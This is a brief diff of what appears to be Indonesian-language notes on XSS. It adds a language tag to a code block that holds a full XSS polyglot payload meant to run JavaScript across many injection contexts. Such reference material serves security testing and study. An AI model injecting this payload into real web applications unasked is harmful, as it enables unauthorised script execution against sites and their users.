@@ -28,7 +28,7 @@ Ini adalah bagian dari instruksi yang dieksekusi untuk mengeksploitasi kerentana
 Poliglot XSS adalah string yang mampu disuntikkan ke dalam beberapa konteks yang berbeda dan masih menghasilkan eksekusi JavaScript, ini bekerja di lebih dari 20 konteks.
 
 - payload for xss polyglots
-```
+```xss polyglots
 jaVasCript:/*-/*`/*`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>x3csVg/<sVg/oNloAd=alert()//>x3e
 ```
 
